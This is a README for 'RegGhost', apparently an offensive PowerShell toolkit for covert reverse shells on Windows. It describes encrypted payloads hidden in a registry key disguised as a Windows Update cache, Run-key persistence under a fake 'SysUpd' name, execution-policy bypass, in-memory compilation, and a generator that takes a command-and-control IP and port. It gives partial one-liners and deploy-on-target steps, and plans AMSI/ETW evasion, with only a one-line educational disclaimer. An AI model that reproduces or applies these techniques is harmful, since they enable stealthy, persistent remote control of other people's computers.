# RegGhost

![Phantom Key Logo](sandbox:/mnt/data/A_logo_for_a_software_or_cybersecurity_product_nam.png)

A compact, two-stage PowerShell toolkit designed for stealthy reverse shells on Windows. It leverages machine-specific encryption, in-memory execution, and registry-based persistence—no payload files remain on disk.

---

## 🛠️ Features

**1. Two-Stage Architecture**

* **Setup Stage** (`smaller_setup.ps1`):

  * Base64-encoded C# payload is XOR-encrypted with a BIOS-derived key and stored in `HKCU:\Software\WindowsUpdate\DataCache`.
  * Installs a single `Run`-key entry (`SysUpd`) pointing to an encoded PowerShell stub, ensuring execution at each user logon with no `.ps1` files on disk.
* **Execution Stage** (`small_execute.ps1`):

  * Reads, decrypts, and compiles the C# payload in memory via `Add-Type`.
  * Invokes `C_XXXXX::Start()` (customizable class name) to establish a persistent reverse shell loop.

**2. Dynamic, Host-Bound Encryption**

* Encryption key derived from `(Get-WmiObject Win32_BIOS).SerialNumber`, binding payload to the specific machine.
* XOR + Base64 obfuscation conceals plaintext payloads in the registry.

**3. In-Memory C# Compilation**

* Utilizes `Add-Type` to compile and load decrypted source at runtime, avoiding any disk I/O for the payload.

**4. Registry-Only Storage & Persistence**

* **Payload** stored as a string value under `HKCU:\Software\WindowsUpdate\DataCache`.
* **Persistence** via `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SysUpd` running `powershell -EncodedCommand` stub.

**5. Minimal Footprint**

* No additional binaries; relies solely on native PowerShell and .NET.
* Build outputs organized into randomly-named phonetic folders (Alpha, Bravo, Charlie, etc.).

---

## 📂 Components

### 1. `smaller_setup.ps1`

```powershell
# Auto-generated one-liner:
$k=(gwmi win32_bios).serialnumber.trim(); ... sp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run SysUpd "powershell -NoP -EP Bypass -Enc $enc"
```

* Decrypts and decodes the embedded Base64 C# payload.
* Stores ciphertext in the registry and installs persistence via Run key.

### 2. `small_execute.ps1`

```powershell
# Auto-generated one-liner:
$k=(gwmi win32_bios).serialnumber.trim(); ... [<YourClass>]::Start()
```

* Reads registry blob, decrypts, compiles payload in memory, and launches the reverse shell.

### 3. `generate_shell.py`

* Python CLI that builds both PS1 stubs with host/port injection, obfuscation, and encryption:

  ```bash
  python generate_shell.py -H <C2_IP> -P <PORT>
  ```
* Outputs a new folder named from the phonetic alphabet (Alpha, Bravo, …).

---

## ⚙️ Usage

1. **Generate Payload**

   ```bash
   python generate_shell.py -H 10.10.14.1 -P 4444
   ```

   * Reads `payload.cs`, injects obfuscated host/port, encrypts, and creates PS1 files in a new folder.

2. **Deploy on Target**

   ```powershell
   .\Alpha\smaller_setup.ps1
   ```

   * Installs encrypted payload and persistence without leaving any scripts on disk.

3. **Automatic Execution**

   * On next user logon, the Run-key stub auto-executes, decrypting and running the reverse shell.

4. **Manual Testing**

   ```powershell
   .\Alpha\small_execute.ps1
   ```

   * Useful for quick staging or validation without reboot.

---

## 🚧 Limitations & Future Enhancements

* **Stronger Encryption**: Replace XOR with AES-CBC and random IV for enhanced confidentiality.
* **Fallback Persistence**: Add Scheduled Tasks or WMI Event Subscriptions as fallback.
* **Evasion**: Integrate AMSI/ETW bypass techniques and code obfuscation (e.g. Invoke-Obfuscation).
* **Logging**: Implement silent error logging to Event Log or hidden file for reliable troubleshooting.

---

*⚠️ For educational and authorized red-team use only.*
